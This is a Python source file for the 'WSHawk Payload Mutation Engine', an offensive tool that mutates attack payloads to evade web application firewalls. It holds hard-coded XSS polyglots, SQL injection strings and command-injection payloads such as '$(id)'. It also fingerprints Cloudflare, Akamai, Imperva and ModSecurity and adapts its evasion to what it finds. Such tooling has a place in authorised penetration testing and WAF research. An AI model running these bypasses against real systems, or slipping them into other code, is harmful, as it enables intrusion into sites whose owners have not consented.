#!/usr/bin/env python3
"""
WSHawk Payload Mutation Engine
Production-grade WAF bypass with adaptive learning
"""

import random
import re
import base64
from typing import List, Dict, Set, Tuple
from enum import Enum
from collections import defaultdict

class MutationStrategy(Enum):
    """Mutation strategies"""
    ENCODING = "encoding"
    CASE_VARIATION = "case"
    COMMENT_INJECTION = "comment"
    WHITESPACE = "whitespace"
    CONCATENATION = "concat"
    BYPASS_FILTER = "bypass"
    TAG_BREAKING = "tag_break"
    POLYGLOT = "polyglot"

class PayloadMutator:
    """
    Payload mutation engine with WAF bypass capabilities
    """
    
    def __init__(self):
        # Weighted strategy scoring system
        self.strategy_scores = defaultdict(lambda: 1.0)  # Start at 1.0
        self.failed_mutations = set()
        self.successful_patterns = defaultdict(list)
        
        # Server fingerprinting
        self.waf_detected = None
        self.filter_patterns = set()
        self.response_patterns = defaultdict(int)
        
        # Mutation history
        self.mutation_history = []
        
    def mutate_payload(self, base_payload: str, strategy: MutationStrategy, count: int = 5) -> List[str]:
        """Generate payload mutations using specified strategy"""
        if strategy == MutationStrategy.ENCODING:
            return self._encoding_mutations(base_payload, count)
        elif strategy == MutationStrategy.CASE_VARIATION:
            return self._case_mutations(base_payload, count)
        elif strategy == MutationStrategy.COMMENT_INJECTION:
            return self._comment_mutations(base_payload, count)
        elif strategy == MutationStrategy.WHITESPACE:
            return self._whitespace_mutations(base_payload, count)
        elif strategy == MutationStrategy.CONCATENATION:
            return self._concatenation_mutations(base_payload, count)
        elif strategy == MutationStrategy.BYPASS_FILTER:
            return self._bypass_mutations(base_payload, count)
        elif strategy == MutationStrategy.TAG_BREAKING:
            return self._tag_breaking_mutations(base_payload, count)
        elif strategy == MutationStrategy.POLYGLOT:
            return self._polyglot_mutations(base_payload, count)
        
        return [base_payload]
    
    def _encoding_mutations(self, payload: str, count: int) -> List[str]:
        """Advanced encoding mutations for WAF bypass"""
        mutations = []
        
        # URL encoding
        mutations.append(''.join(f'%{ord(c):02x}' for c in payload))
        
        # Double URL encoding
        mutations.append(''.join(f'%25{ord(c):02x}' for c in payload))
        
        # HTML entity encoding (decimal)
        mutations.append(''.join(f'&#{ord(c)};' for c in payload))
        
        # HTML entity encoding (hex)
        mutations.append(''.join(f'&#x{ord(c):x};' for c in payload))
        
        # Unicode encoding
        mutations.append(''.join(f'\\u{ord(c):04x}' for c in payload))
        
        # UTF-7 encoding
        try:
            mutations.append(payload.encode('utf-7').decode('ascii'))
        except (UnicodeEncodeError, UnicodeDecodeError):
            pass
        
        # UTF-16 BE
        try:
            utf16 = payload.encode('utf-16-be')
            mutations.append(''.join(f'%{b:02x}' for b in utf16))
        except (UnicodeEncodeError, UnicodeDecodeError):
            pass
        
        # Base64 encoding
        mutations.append(base64.b64encode(payload.encode()).decode())
        
        # Mixed encoding (partial URL + partial entity)
        if len(payload) > 3:
            mixed = list(payload)
            for i in range(0, len(mixed), 3):
                if i % 2 == 0:
                    mixed[i] = f'%{ord(mixed[i]):02x}'
                else:
                    mixed[i] = f'&#{ord(mixed[i])};'
            mutations.append(''.join(mixed))
        
        # Overlong UTF-8
        mutations.append(payload.replace('<', '%C0%BC').replace('>', '%C0%BE'))
        
        # Character reference obfuscation
        mutations.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
        
        return mutations[:count]
    
    def _case_mutations(self, payload: str, count: int) -> List[str]:
        """Case variation mutations"""
        mutations = []
        
        mutations.append(payload.upper())
        mutations.append(payload.lower())
        mutations.append(''.join(c.upper() if i % 2 == 0 else c.lower() 
                                for i, c in enumerate(payload)))
        
        # Random case (multiple variants)
        for _ in range(count - 3):
            mutations.append(''.join(c.upper() if random.random() > 0.5 else c.lower() 
                                    for c in payload))
        
        return mutations[:count]
    
    def _comment_mutations(self, payload: str, count: int) -> List[str]:
        """Universal comment injection for all payload types"""
        mutations = []
        
        # SQL comment injection
        mutations.append(payload.replace(' ', '/**/'))
        mutations.append(payload.replace(' ', '--\n'))
        mutations.append(payload.replace('=', '/**/=/**/'))
        mutations.append(payload.replace('OR', '/**/OR/**/'))
        mutations.append(payload.replace('AND', '/**/AND/**/'))
        mutations.append(payload.replace("'", "'/**/"))
        
        # MySQL-specific
        mutations.append(payload.replace(' ', '/*!*/'))
        mutations.append(payload.replace('SELECT', 'SE/**/LECT'))
        
        # HTML/XSS comment injection
        if '<' in payload:
            mutations.append(payload.replace('<', '<!--><'))
            mutations.append(payload.replace('>', '><!---->'))
            mutations.append(payload.replace('<', '</**/>'))
        
        # JavaScript comment injection
        mutations.append(payload.replace('(', '(/*/'))
        mutations.append(payload.replace(')', '/*/'))
        mutations.append(payload.replace('alert', 'ale/**/rt'))
        mutations.append(payload.replace('prompt', 'pro/**/mpt'))
        mutations.append(payload.replace('confirm', 'con/**/firm'))
        mutations.append(payload.replace('eval', 'ev/**/al'))
        
        return mutations[:count]
    
    def _whitespace_mutations(self, payload: str, count: int) -> List[str]:
        """Whitespace manipulation"""
        mutations = []
        
        mutations.append(payload.replace(' ', '\t'))
        mutations.append(payload.replace(' ', '\n'))
        mutations.append(payload.replace(' ', '\r'))
        mutations.append(payload.replace(' ', '\x0b'))  # Vertical tab
        mutations.append(payload.replace(' ', '\x0c'))  # Form feed
        mutations.append(payload.replace(' ', '  '))
        mutations.append(payload.replace(' ', ''))
        mutations.append(payload.replace(' ', '%09'))  # Tab
        mutations.append(payload.replace(' ', '%0a'))  # Newline
        mutations.append(payload.replace(' ', '%0d'))  # Carriage return
        
        return mutations[:count]
    
    def _concatenation_mutations(self, payload: str, count: int) -> List[str]:
        """Universal string concatenation"""
        mutations = []
        
        # JavaScript concatenation
        if len(payload) >= 4:
            mid = len(payload) // 2
            mutations.append(f"'{payload[:mid]}'+ '{payload[mid:]}'")
            mutations.append(f"'{payload[:mid]}'+ `{payload[mid:]}`")
            mutations.append(f"`{payload[:mid]}${{'{payload[mid:]}'}}`")
        
        # SQL concatenation
        if len(payload) >= 4:
            mid = len(payload) // 2
            mutations.append(f"'{payload[:mid]}'||'{payload[mid:]}'")
            mutations.append(f"'{payload[:mid]}'+ '{payload[mid:]}'")
            mutations.append(f"CONCAT('{payload[:mid]}','{payload[mid:]}')")
        
        # Python concatenation
        if len(payload) >= 4:
            mid = len(payload) // 2
            mutations.append(f'"{payload[:mid]}"+ "{payload[mid:]}"')
            mutations.append(f'"{payload[:mid]}".join("{payload[mid:]}")')
        
        # Character code concatenation (JS)
        if len(payload) <= 10:  # Only for short payloads
            char_codes = '+'.join(f'String.fromCharCode({ord(c)})' for c in payload)
            mutations.append(char_codes)
        
        return mutations[:count]
    
    def _bypass_mutations(self, payload: str, count: int) -> List[str]:
        """Bypass mutations"""
        mutations = []
        
        # Null byte injection
        mutations.append(payload + '\x00')
        mutations.append('\x00' + payload)
        mutations.append(payload.replace('<', '<\x00'))
        
        # Double encoding
        mutations.append(payload.replace('<', '%253C').replace('>', '%253E'))
        mutations.append(payload.replace("'", '%2527'))
        mutations.append(payload.replace('"', '%2522'))
        
        # Tag breaking (generic)
        if '<' in payload:
            mutations.append(payload.replace('<', '<<'))
            mutations.append(payload.replace('<', '< '))
            mutations.append(payload.replace('<', '<\n'))
            mutations.append(payload.replace('>', ' >'))
        
        # Unicode normalization bypass
        mutations.append(payload.replace('a', '\u0061'))
        mutations.append(payload.replace('s', '\u0073'))
        mutations.append(payload.replace('<', '\u003c'))
        mutations.append(payload.replace('>', '\u003e'))
        
        # Newline/tab injection
        mutations.append(payload.replace('<', '<\n'))
        mutations.append(payload.replace('>', '\n>'))
        
        return mutations[:count]
    
    def _tag_breaking_mutations(self, payload: str, count: int) -> List[str]:
        """Advanced tag breaking for XSS bypass"""
        mutations = []
        
        if '<' not in payload:
            return mutations
        
        # Split tags
        mutations.append(payload.replace('<script', '<scr<script>ipt'))
        mutations.append(payload.replace('<img', '<i<img>mg'))
        mutations.append(payload.replace('<svg', '<s<svg>vg'))
        
        # Encode only opening bracket
        mutations.append(payload.replace('<', '%3c'))
        mutations.append(payload.replace('<', '&lt;'))
        mutations.append(payload.replace('<', '\\x3c'))
        
        # Break event handlers
        mutations.append(payload.replace('on', 'o\x00n'))
        mutations.append(payload.replace('on', 'o\nn'))
        mutations.append(payload.replace('onerror', 'on\nerror'))
        mutations.append(payload.replace('onload', 'on\nload'))
        
        # Void elements
        mutations.append('<base href=javascript:alert(1)//')
        mutations.append('<link rel=import href=data:,alert(1)>')
        mutations.append('<meta http-equiv=refresh content=0;url=javascript:alert(1)>')
        
        # Collapsed tags
        mutations.append('<<script>alert(1)//<</script>')
        mutations.append('<scr<script>ipt>alert(1)</scr</script>ipt>')
        
        return mutations[:count]
    
    def _polyglot_mutations(self, payload: str, count: int) -> List[str]:
        """Polyglot payloads that work in multiple contexts"""
        mutations = []
        
        # XSS polyglots
        mutations.append('jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//')
        mutations.append('\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'"><img src="http://i.imgur.com/P8mL8.jpg">')
        
        # SQL polyglots
        mutations.append("' OR '1'='1' -- ")
        mutations.append("' OR 1=1--")
        mutations.append("\" OR \"1\"=\"1\" -- ")
        mutations.append("' OR 'a'='a")
        mutations.append("') OR ('1'='1")
        
        # Command injection polyglots
        mutations.append("; id #")
        mutations.append("| id #")
        mutations.append("& id #")
        mutations.append("`id`")
        mutations.append("$(id)")
        
        return mutations[:count]
    
    def learn_from_response(self, payload: str, response: str, is_blocked: bool, response_time: float = 0):
        """
        Heuristic learning from server response
        """
        response_lower = response.lower()
        
        # Track response patterns
        self.response_patterns[response[:50]] += 1
        
        if is_blocked:
            self.failed_mutations.add(payload)
            
            # WAF signature detection
            waf_signatures = {
                'cloudflare': ['cloudflare', 'cf-ray', 'error 1020'],
                'akamai': ['akamai', 'reference #'],
                'imperva': ['imperva', 'incapsula'],
                'f5': ['f5', 'bigip'],
                'aws_waf': ['aws', 'x-amzn-requestid'],
                'modsecurity': ['mod_security', 'modsec'],
            }
            
            for waf, signatures in waf_signatures.items():
                if any(sig in response_lower for sig in signatures):
                    self.waf_detected = waf
                    break
            
            # Detect filter patterns
            filter_indicators = [
                ('bad request', 'generic_filter'),
                ('malicious', 'malicious_filter'),
                ('403', 'forbidden_filter'),
                ('policy violation', 'policy_filter'),
                ('unexpected token', 'syntax_filter'),
                ('input sanitized', 'sanitizer'),
                ('invalid', 'validation_filter'),
                ('blocked', 'generic_block'),
                ('denied', 'access_denied'),
            ]
            
            for indicator, filter_type in filter_indicators:
                if indicator in response_lower:
                    self.filter_patterns.add(filter_type)
            
            # Detect specific keyword filtering
            if 'script' in response_lower:
                self.filter_patterns.add('script_keyword')
            if 'select' in response_lower or 'union' in response_lower:
                self.filter_patterns.add('sql_keyword')
            if 'eval' in response_lower or 'exec' in response_lower:
                self.filter_patterns.add('code_exec_keyword')
                
        else:
            # Success - boost strategy score
            for strategy in MutationStrategy:
                if self._payload_uses_strategy(payload, strategy):
                    self.strategy_scores[strategy.value] *= 1.2  # Boost by 20%
                    self.successful_patterns[strategy.value].append(payload)
        
        # Track mutation
        self.mutation_history.append({
            'payload': payload,
            'blocked': is_blocked,
            'response_time': response_time
        })
    
    def _payload_uses_strategy(self, payload: str, strategy: MutationStrategy) -> bool:
        """Detect if payload uses a specific strategy"""
        if strategy == MutationStrategy.ENCODING:
            return '%' in payload or '&#' in payload or '\\u' in payload
        elif strategy == MutationStrategy.COMMENT_INJECTION:
            return '/**/' in payload or '--' in payload or '<!--' in payload
        elif strategy == MutationStrategy.CONCATENATION:
            return '+' in payload or '||' in payload or 'CONCAT' in payload
        elif strategy == MutationStrategy.TAG_BREAKING:
            return '<<' in payload or '<\n' in payload
        return False
    
    def get_recommended_strategy(self) -> MutationStrategy:
        """
        Adaptive strategy recommendation based on heuristics
        """
        # If WAF detected, use targeted strategies
        if self.waf_detected:
            waf_strategies = {
                'cloudflare': MutationStrategy.ENCODING,
                'akamai': MutationStrategy.TAG_BREAKING,
                'imperva': MutationStrategy.POLYGLOT,
                'modsecurity': MutationStrategy.COMMENT_INJECTION,
            }
            if self.waf_detected in waf_strategies:
                return waf_strategies[self.waf_detected]
        
        # Filter-based recommendations
        if 'script_keyword' in self.filter_patterns:
            return MutationStrategy.TAG_BREAKING
        elif 'sql_keyword' in self.filter_patterns:
            return MutationStrategy.COMMENT_INJECTION
        elif 'generic_filter' in self.filter_patterns:
            return MutationStrategy.ENCODING
        
        # Use highest scoring strategy
        if self.strategy_scores:
            best_strategy = max(self.strategy_scores.items(), key=lambda x: x[1])
            return MutationStrategy(best_strategy[0])
        
        return MutationStrategy.ENCODING
    
    def generate_adaptive_payloads(self, base_payload: str, max_count: int = 15) -> List[str]:
        """
        Generate adaptively mutated payloads using weighted strategies
        """
        payloads = [base_payload]
        
        # Get strategy priority
        sorted_strategies = sorted(
            self.strategy_scores.items(),
            key=lambda x: x[1],
            reverse=True
        )
        
        # Use top strategies
        for strategy_name, score in sorted_strategies[:3]:
            strategy = MutationStrategy(strategy_name)
            count = int(3 * score)
            payloads.extend(self.mutate_payload(base_payload, strategy, count))
        
        # Always try recommended strategy
        recommended = self.get_recommended_strategy()
        payloads.extend(self.mutate_payload(base_payload, recommended, 3))
        
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)
        
        return unique_payloads[:max_count]

if __name__ == "__main__":
    mutator = PayloadMutator()
    print("WSHawk Payload Mutation Engine loaded.")
